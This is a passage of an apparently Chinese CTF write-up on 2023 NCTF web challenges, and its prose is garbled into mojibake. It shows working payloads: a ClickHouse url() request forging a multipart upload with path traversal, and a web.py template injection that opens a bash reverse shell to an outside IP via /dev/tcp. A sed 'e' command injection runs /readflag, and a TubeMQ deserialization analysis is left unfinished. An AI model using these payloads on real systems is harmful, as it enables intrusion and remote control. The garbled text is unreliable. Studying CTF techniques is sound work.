<p>ä½†æ˜¯æ¥ä¸‹æ¥æœ¬åœ°ç¯å¢ƒå‡ºç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œ<code>url()</code>å½“ä¸­çš„<code>headers()</code>å‡½æ•°clickhouseæ— æ³•è¯†åˆ«ï¼ŒæŸ¥äº†<a target="_blank" rel="noopener" href="https://github.com/ClickHouse/ClickHouse/issues/37897">ç¤¾åŒºè®¨è®º</a>åå‘ç°ï¼Œä¼¼ä¹å®˜æ–¹æœ‰æ‰“ç®—åŠ å…¥è¿™ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”å®˜æ–¹æ–‡æ¡£ä¹Ÿæœ‰ï¼Œæ‰€ä»¥å¤§èƒ†çŒœæµ‹åº”è¯¥æ˜¯é¢˜ç›®ç¯å¢ƒå¤ªè€äº†ï¼Œäºæ˜¯æœæ–­ç”¨23ç‰ˆæœ¬æŠŠ21ç‰ˆæ¢æ‰äº†ï¼Œæœç„¶å°±ä¸ä¼šå‡ºç°è¯†åˆ«ä¸åˆ°å‡½æ•°çš„é”™è¯¯äº†</p>
<p>å°è¯•æ„é€ ä¸Šä¼ payload,åœ¨è¿™ä¹‹å‰æˆ‘ä»¬éœ€è¦æ·±å…¥äº†è§£ä¸€ä¸‹<code>url()</code>çš„ç¬¬äºŒä¸ªå‚æ•°<a target="_blank" rel="noopener" href="https://clickhouse.com/docs/en/interfaces/formats#formats">format</a>,ä¸‹é¢çš„payloadæˆ‘ä¸€å¼€å§‹è¿˜æ˜¯å’Œç¬¬ä¸€æ¬¡é‚£æ ·è®©<code>format</code>ä¸º<code>CSV</code>,ä½†æ˜¯è¿™æ ·ä¸Šä¼ ä¹‹ålogé‡Œé¢å‡ºç°äº†è¿™æ ·çš„é”™è¯¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs log">[2023-12-28 15:18:18 +0000] [8] [CRITICAL] WORKER TIMEOUT (pid:47)<br>[2023-12-28 15:18:18 +0000] [47] [INFO] Worker exiting (pid: 47)<br>[2023-12-28 15:18:18 +0000] [8] [ERROR] Worker (pid:47) exited with code 1<br>[2023-12-28 15:18:18 +0000] [8] [ERROR] Worker (pid:47) exited with code 1.<br>[2023-12-28 15:18:18 +0000] [52] [INFO] Booting worker with pid: 52<br>Traceback (most recent call last):<br>  File &quot;/usr/local/lib/python3.11/site-packages/web/application.py&quot;, line 280, in process<br>    return self.handle()<br>           ^^^^^^^^^^^^^<br>  File &quot;/usr/local/lib/python3.11/site-packages/web/application.py&quot;, line 271, in handle<br>    return self._delegate(fn, self.fvars, args)<br>           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^<br>  File &quot;/usr/local/lib/python3.11/site-packages/web/application.py&quot;, line 517, in _delegate<br>    return handle_class(cls)<br>           ^^^^^^^^^^^^^^^^^<br>  File &quot;/usr/local/lib/python3.11/site-packages/web/application.py&quot;, line 495, in handle_class<br>    return tocall(*args)<br>           ^^^^^^^^^^^^^<br>  File &quot;/app/run.py&quot;, line 70, in POST<br>    filepath = os.path.join(&#x27;upload/&#x27;, files.myfile.filename)<br>                                       ^^^^^^^^^^^^^^^^^^^^^<br>AttributeError: &#x27;dict&#x27; object has no attribute &#x27;filename&#x27;<br></code></pre></td></tr></table></figure>

<p>è¿™è®©æˆ‘æƒ³èµ·äº†æˆ‘çš„æµ‹è¯•payloadï¼Œæµ‹è¯•çš„payloadä¹Ÿå‡ºç°äº†ä¸Šè¿°çš„é”™è¯¯ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ç²¾å¿ƒæ„é€ çš„httpåŒ…æœ€åè§£æçš„ç»“æœå’Œæµ‹è¯•payloadä¸€æ ·ï¼Œå°±æ˜¯ä¸ªå•çº¯çš„å­—ç¬¦ä¸²ï¼Œè€Œæ²¡æœ‰å½¢æˆ<code>multipart/form</code>æ ¼å¼</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">FUNCTION</span> url(<span class="hljs-string">&#x27;http://172.30.0.3:8001/api/upload&#x27;</span>, <span class="hljs-string">&#x27;CSV&#x27;</span>, <span class="hljs-string">&#x27;x String&#x27;</span>,headers(<span class="hljs-string">&#x27;X-Access-Token&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;cbed5f0c829320a82e5d5f4713b02425&#x27;</span>)) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;123456&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬å…ˆå»clickhouse-clienté‡Œé¢çœ‹çœ‹æ˜¯æ€ä¹ˆå›äº‹ï¼Œæµè§ˆæ–‡æ¡£åæˆ‘ä¸»è¦åšäº†ä»¥ä¸‹æµ‹è¯•,æ–‡æ¡£è¯´formatæ˜¯å¯¹inputå’Œoutputçš„æ ¼å¼è½¬æ¢ï¼Œä¹Ÿå°±æ˜¯åˆ†åˆ«å¯¹åº”äº†insertå’Œselectã€‚ç»è¿‡ä¸‹é¢çš„æµ‹è¯•ç­”æ¡ˆå·²ç»å‘¼ä¹‹æ¬²å‡ºäº†ï¼Œå› ä¸ºæˆ‘ä½¿ç”¨çš„æ˜¯CSVæ ¼å¼ï¼Œå³ä½¿<code>\r\n</code>éƒ½æ­£ç¡®è§£æäº†ï¼Œä½†æ˜¯æ•´ä¸ªæ•°æ®å´è¢«<code>&quot;</code>åŒ…è£¹èµ·æ¥äº†ï¼Œæ˜¾ç„¶è¿™ä¸æ˜¯åˆè§„çš„httpè¯·æ±‚åŒ…ã€‚ç„¶åå†çœ‹çœ‹<code>TabSeparated</code>å’Œ<code>TabSeparatedRaw</code>åº”è¯¥é€‰æ‹©å“ªä¸ªï¼Œå¾ˆæ˜æ˜¾æ˜¯<code>TabSeparatedRaw</code>ï¼Œå®ƒæ—¢å®Œæˆæ¢è¡Œï¼Œä¹Ÿæ²¡æœ‰è¢«å¼•å·åŒ…è£¹</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">3</span>beb84db6e9c :) <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;hello\nwrold&#x27;</span> FORMAT CSV<br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;hello\nwrold&#x27;</span><br>FORMAT CSV<br><br>Query id: cae15584<span class="hljs-number">-008e-4810</span><span class="hljs-number">-9416</span><span class="hljs-operator">-</span>e010b394a3e4<br><br>&quot;hello<br>wrold&quot;<br><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> set. Elapsed: <span class="hljs-number">0.001</span> sec.<br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">3</span>beb84db6e9c :) <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;hello\nwrold&#x27;</span> FORMAT TabSeparated<br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;hello\nwrold&#x27;</span><br>FORMAT TabSeparated<br><br>Query id: <span class="hljs-number">8</span>cb146ed<span class="hljs-operator">-</span>c53c<span class="hljs-number">-4e3</span>f<span class="hljs-operator">-</span>a046<span class="hljs-operator">-</span>fafeb6a81fb3<br><br>hello\nwrold<br><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> set. Elapsed: <span class="hljs-number">0.001</span> sec.<br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">3</span>beb84db6e9c :) <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;hello\nwrold&#x27;</span> FORMAT TabSeparatedRaw<br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;hello\nwrold&#x27;</span><br>FORMAT TabSeparatedRaw<br><br>Query id: <span class="hljs-number">52</span>f51cd8<span class="hljs-number">-7528</span><span class="hljs-number">-428</span>f<span class="hljs-operator">-</span>ae4c<span class="hljs-number">-68</span>b34c8bb0fa<br><br>hello<br>wrold<br><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> set. Elapsed: <span class="hljs-number">0.001</span> sec. <br></code></pre></td></tr></table></figure>

<p>æœ€åpayloadå°±æ˜¯ä¸‹é¢è¿™ä¸ª</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">FUNCTION</span> url(<span class="hljs-string">&#x27;http://172.30.0.3:8001/api/upload&#x27;</span>, <span class="hljs-string">&#x27;TabSeparatedRaw&#x27;</span>, <span class="hljs-string">&#x27;x String&#x27;</span>,headers(<span class="hljs-string">&#x27;X-Access-Token&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;cbed5f0c829320a82e5d5f4713b02425&#x27;</span>,<span class="hljs-string">&#x27;Content-Type&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;multipart/form-data;boundary=----WebKitFormBoundarytxS8SovqVYBwwSzG&#x27;</span>)) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;------WebKitFormBoundarytxS8SovqVYBwwSzG\r\nContent-Disposition: form-data; name=&quot;myfile&quot;; filename=&quot;ban.txt&quot;\r\nContent-Type: text/plain\r\n\r\nthis is a test\r\n------WebKitFormBoundarytxS8SovqVYBwwSzG--&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°filenameèƒ½ç›®å½•ç©¿è¶Šï¼Œé‚£ä¹ˆç°åœ¨æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä»»æ„æ–‡ä»¶äº†ï¼Œå†çœ‹çœ‹æºç å¦‚ä½•åˆ©ç”¨å®ƒï¼Œé‡æ–°å›åˆ°æˆ‘ä»¬ä»»æ„æ–‡ä»¶è¯»å–çš„é‚£æ®µä»£ç ï¼Œå›åˆ°å®ƒåŸæœ¬çš„ç”¨å¤„ï¼Œæ¸²æŸ“é¡µé¢ã€‚ä¹‹å‰å†™è¿‡jinjia2çš„sstiï¼Œé‚£ä¹ˆå…ˆæœ¬åœ°è¯•è¯•web.pyèƒ½å¦å’Œflaskä¸€æ ·è¿›è¡Œsstiæ³¨å…¥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>render = web.template.render(<span class="hljs-string">&#x27;templates/&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Index</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GET</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> render.index()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">POST</span>(<span class="hljs-params">self</span>):<br>        data = web.<span class="hljs-built_in">input</span>(name=<span class="hljs-string">&#x27;index&#x27;</span>)<br>        <span class="hljs-keyword">return</span> render.__getattr__(data.name)()<br><br></code></pre></td></tr></table></figure>

<p>å…ˆæ­å»ºä¸€ä¸ªç±»ä¼¼çš„æœåŠ¡ï¼ŒæŸ¥é˜…<a target="_blank" rel="noopener" href="https://webpy.org/docs/0.3/templetor#introduction">web.pyæ–‡æ¡£</a>ï¼Œæ–‡æ¡£å†™åˆ°<code>$&#123;&#125;</code>å°†ä¼šè§£æå…¶ä¸­çš„å†…å®¹ï¼Œäºæ˜¯æˆ‘å†™äº†ä¸‹é¢çš„htmlï¼Œå¹¶ä¸”æˆåŠŸè§£æäº†2ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±ç®€å•äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> web<br><br>urls = (<br>    <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;Index&#x27;</span>,<br>)<br><br>render = web.template.render(<span class="hljs-string">&#x27;./&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Index</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GET</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> render.__getattr__(<span class="hljs-string">&#x27;index&#x27;</span>)()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>   app = web.application(urls, <span class="hljs-built_in">globals</span>()) <br>   app.run()<br></code></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    $&#123;1+1&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä½†æ˜¯å½“æˆ‘å°è¯•è§£æ<code>$&#123;().__class__&#125;</code>æ—¶ï¼Œå‡ºç°äº†å¦‚ä¸‹é”™è¯¯ï¼Œè²Œä¼¼æœ‰å®˜æ–¹æœ‰å®‰å…¨é˜²æŠ¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs log">    raise SecurityError(&quot;\n&quot;.join([str(err) for err in self.errors]))<br>web.template.SecurityError: templates/test.html:6 - access to attribute &#x27;__class__&#x27; is denied<br></code></pre></td></tr></table></figure>

<p>ç»§ç»­æŸ¥çœ‹æ–‡æ¡£ï¼Œå‘ç°äº†<code>$code</code>å˜é‡ï¼Œä¼¼ä¹ä»»æ„ä»£ç éƒ½èƒ½åœ¨é‡Œé¢æ‰§è¡Œï¼Œè™½ç„¶æœ‰ä¸€å®šçš„é™åˆ¶ä½†æ˜¯å‘ç°<code>$code:__import__(&#39;os&#39;).system(&#39;calc&#39;)</code>è¿™ä¸ªpayloadå¯ä»¥æ­£å¸¸æ‰§è¡Œ</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/webtemp.jpg" class="">

<p>ä¸‹é¢æˆ‘ä»¬å°è¯•<code>$code:__import__(&#39;os&#39;).system(&#39;/readflag&#39;)</code>ï¼Œä¸ºäº†æ‰§è¡Œreadflagè¿™é‡Œé€‰æ‹©åå¼¹shellï¼Œ<code>$code:__import__(\&#39;os\&#39;).system(\&#39;/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/8.134.147.85/80 0&gt;&amp;1&quot;\&#39;)</code>ï¼Œç°åœ¨æˆ‘ä»¬getshellï¼Œçœ‹åˆ°readflagæƒé™<code>-rwsr-xr-x   1 root root 1936768 Dec 24 14:20 readflag</code>,æŸ¥é˜…<a target="_blank" rel="noopener" href="https://aiops.com/news/post/5439.html">sæƒé™</a>ï¼Œuserç»„å«æœ‰sæƒé™ï¼Œé‚£ä¹ˆç¨‹åºå°†ä»¥ç”¨æˆ·æ‰€æœ‰è€…çš„æƒé™è¿è¡Œï¼Œäºæ˜¯æˆ‘ä»¬å°±èƒ½ç›´æ¥è¿è¡Œreadflag</p>
<h2 id="3-webshellgenerator"><a href="#3-webshellgenerator" class="headerlink" title="3.webshellgenerator"></a>3.webshellgenerator</h2><p>åœ¨<strong>index.php</strong>ä¸­æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶<strong>key</strong>å’Œ<strong>method</strong>ï¼Œå®ƒä»¬çš„å€¼å°†è¢«ä¼ é€’åˆ°ç³»ç»Ÿç¯å¢ƒå˜é‡<code>$KEY</code>å’Œ<code>$METHOD</code>ï¼Œç„¶åä¼šæ‰§è¡Œä»¥ä¸‹shè„šæœ¬</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-built_in">set</span> -e<br><br>NEW_FILENAME=$(<span class="hljs-built_in">tr</span> -dc a-z0-9 &lt;/dev/urandom | <span class="hljs-built_in">head</span> -c 16)<br><span class="hljs-built_in">cp</span> template.php <span class="hljs-string">&quot;/tmp/<span class="hljs-variable">$NEW_FILENAME</span>&quot;</span><br><span class="hljs-built_in">cd</span> /tmp<br><br>sed -i <span class="hljs-string">&quot;s/KEY/<span class="hljs-variable">$KEY</span>/g&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$NEW_FILENAME</span>&quot;</span><br>sed -i <span class="hljs-string">&quot;s/METHOD/<span class="hljs-variable">$METHOD</span>/g&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$NEW_FILENAME</span>&quot;</span><br><br><span class="hljs-built_in">realpath</span> <span class="hljs-string">&quot;<span class="hljs-variable">$NEW_FILENAME</span>&quot;</span><br></code></pre></td></tr></table></figure>

<p>åˆ°è¿™é‡Œç¬¬ä¸€ä¸ªæƒ³åˆ°çš„æ˜¯èƒ½å¦è¿›è¡Œ<strong>shè„šæœ¬æ³¨å…¥</strong>ï¼Œé€šè¿‡æ§åˆ¶<strong>key</strong>å’Œ<strong>method</strong>æ¥é—­åˆsedå‘½ä»¤çš„<code>&quot;</code>ï¼Œäºæ˜¯æˆ‘åšäº†è¿™æ ·çš„æµ‹è¯•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br><span class="hljs-variable">$key</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>];<br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;KEY=<span class="hljs-subst">$key</span>&quot;</span>);<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;sh test.sh&quot;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$res</span>);<br></code></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">set</span> -e<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;something<span class="hljs-variable">$KEY</span>&quot;</span><br></code></pre></td></tr></table></figure>

<p>æˆ‘å°è¯•GETä¼ å…¥<code>?1=1&quot;;sleep+5%23</code>å’Œ<code>?1=\</code>ï¼Œå®ƒçš„è¿”å›ç»“æœå¦‚ä¸‹ï¼Œæ— è®ºæ˜¯é—­åˆæ“ä½œè¿˜æ˜¯<code>\</code>è½¬ä¹‰ï¼Œéƒ½æ— æ³•å¥æ•ˆï¼Œå¼•å·ä¼¼ä¹æ— æ³•ä»<code>$KEY</code>é‡Œé¢é€ƒé€¸å‡ºæ¥ï¼Œshæ³¨å…¥å¤±è´¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs log">string(21) &quot;something1&quot;;sleep 5#<br>&quot;<br><br>string(11) &quot;something\<br>&quot;<br></code></pre></td></tr></table></figure>

<p>é‚£ä¹ˆç°åœ¨å¯ç–‘çš„åœ°æ–¹å°±æ˜¯<strong>sed</strong>ï¼ŒæŸ¥é˜…æ–‡æ¡£æˆ‘ä»¬å…ˆçœ‹çœ‹<code>-i</code>å‚æ•°çš„ä½œç”¨<br>æ–°å»ºä¸€ä¸ª<code>sed.txt</code>å…¶å†…å®¹ä¸º<code>abcdefg</code>ï¼Œå½“æœ‰<code>-i</code>å‚æ•°æ—¶ï¼Œä¿®æ”¹åçš„å†…å®¹å°†ä¸ä¼šè¾“å‡ºåˆ°ç»ˆç«¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/Desktop/docker/webshellgenerator]<br>â””â”€# sed &quot;s/a/b/&quot; sed.txt                                                                                                1 â¨¯<br>bbcdefg<br><br>â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/Desktop/docker/webshellgenerator]<br>â””â”€# sed -i &quot;s/a/b/&quot; sed.txt<br><br></code></pre></td></tr></table></figure>

<p>ä¸‹é¢æˆ‘ä»¬å†äº†è§£ä¸€ä¸‹<code>s/KEY/$KEY/g</code>ç¬¬ä¸€ä¸ªå‚æ•°çš„åŒ¹é…æœºåˆ¶ï¼Œç¬¬äºŒä¸ªå‚æ•°æ–‡æ¡£ä¸­è¯´æ˜¯<code>script</code>ï¼ŒæŸ¥é˜…æœ‰å…³<a target="_blank" rel="noopener" href="https://www.gnu.org/software/sed/manual/sed.html#sed-scripts">srcipt</a>éƒ¨åˆ†ï¼Œäºæ˜¯æˆ‘ä»¬æœ‰ä¸¤ä¸ªä¸ªé‡è¦çš„å‘ç°:</p>
<blockquote>
<ol>
<li>scriptä¸­å¦‚æœå­˜åœ¨eæ ‡è¯†ç¬¦ï¼Œé‚£ä¹ˆeåé¢ä»¥ç©ºæ ¼åˆ†å¼€çš„éƒ¨åˆ†å°†è¢«è§†ä½œshell commandæ‰§è¡Œï¼Œç»“æœè¾“å‡ºåˆ°ç»ˆç«¯</li>
<li>scriptä¸­æ”¯æŒ<code>;</code>æ‰§è¡Œå¤šä¸ªè„šæœ¬</li>
</ol>
</blockquote>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/sede.jpg" class="">

<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/sedsep.jpg" class="">

<p>äºæ˜¯æˆ‘åšäº†å¦‚ä¸‹æµ‹è¯•,å‘ç°ç¡®å®å¦‚ä¸Šæ‰§è¡Œå¤šè„šæœ¬ï¼Œå¤šå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/Desktop/docker/webshellgenerator]<br>â””â”€<span class="hljs-comment"># cat sed.txt             </span><br>abcdefg<br>                                                          <br>â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/Desktop/docker/webshellgenerator]<br>â””â”€<span class="hljs-comment"># sed -i &quot;s/a/b/; e echo 1111111111&quot; sed.txt</span><br>                                                        <br>â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/Desktop/docker/webshellgenerator]<br>â””â”€<span class="hljs-comment"># cat sed.txt                               </span><br>1111111111<br>bbcdefg<br></code></pre></td></tr></table></figure>

<p>ç°åœ¨å°è¯•ä»¥ä¸‹çš„<strong>poc</strong><code>key=1/;e sleep 5; s/KEY/1</code>ï¼Œæ‹¼æ¥è¿›sedå°±æ˜¯<code>sed -i &quot;s/KEY/1/;e sleep 5; s/KEY/1/g&quot; &quot;$NEW_FILENAME&quot;</code>ï¼Œæˆ‘ä»¬æˆåŠŸåˆ¶é€ äº†5017msçš„å»¶è¿Ÿï¼Œè¯´æ˜pocå¥æ•ˆ</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/sedpoc.jpg" class="">

<p>æœ€åçš„payload,<code>key=1/;e /readflag; s/KEY/1</code>ï¼Œå‘åŒ…åflagå€¼å°±ä¼šè¢«å†™å…¥webshellä¸­ç›´æ¥è¯»å–å³å¯</p>
<h2 id="4-EvilMQ"><a href="#4-EvilMQ" class="headerlink" title="4.EvilMQ"></a>4.EvilMQ</h2><p>å…ˆæŠŠ<a target="_blank" rel="noopener" href="https://github.com/apache/inlong/tree/master">tubemqdown</a>ä¸‹æ¥ï¼Œå‚è€ƒ<a target="_blank" rel="noopener" href="https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/">ActiveMQ</a>ï¼Œé¢˜ç›®åˆè¯´ä¸è¿™ä¸ªCVEç±»ä¼¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å…¨å±€æœç´¢Throwableï¼Œæœ‰å¾ˆå¤šï¼Œæ‰€ä»¥è¿˜éœ€è¦è¿›ä¸€æ­¥ç­›é€‰</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/throwable1.png" class="">

<p>æˆ‘ä»¬å›åˆ°é¢˜ç›®<code>EvilMQ.jar</code>ï¼Œå¯¹å…³é”®çš„<code>ProducerService</code>ç±»å’Œ<code>ConsumerService</code>ç±»ï¼Œè¿›è¡ŒåŒ…æº¯æºã€‚åœ¨è¿™ä¸¤ä¸ªç±»ä¸­ï¼Œæˆ‘ä»¬èƒ½å‘ç°è¿™æ ·ä¸€æ¡å‡ ä¹ä¸€ç›´çš„è°ƒç”¨é“¾ï¼Œæ‰€ä»¥è¿™tubemqåº”è¯¥å’Œcorerpc.nettyæœ‰å¾ˆå¤§çš„å…³ç³»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">com.example.evilmq.service.ProducerService<br><br>org.apache.inlong.tubemq.client.factory.TubeSingleSessionFactory<br><br>org.apache.inlong.tubemq.corerpc.netty.NettyClientFactory<br></code></pre></td></tr></table></figure>

<p>ç»“åˆä¸Šé¢çš„å…¨å±€æŸ¥æ‰¾ï¼Œæˆ‘ä»¬é€‰å‡ºäº†ä¸‹é¢çš„ç»“æœ</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/throable2.png" class="">

<p>ä¸‹é¢çœ‹çœ‹clientç«¯çš„åˆ†æï¼Œåœ¨<code>channelRead</code>æ–¹æ³•ä¸­çš„<code>MixUtils.unwrapException</code>ä¼šä»serviceè·å–é”™è¯¯å’Œæ ˆè¿½è¸ªï¼Œå¹¶å’Œ<code>#</code>æ‹¼æ¥æˆå­—ç¬¦ä¸²ä¼ å…¥è¯¥æ–¹æ³•ï¼Œè·Ÿè¿›è¿™ä¸€å¤„</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/clientThr.png" class="">

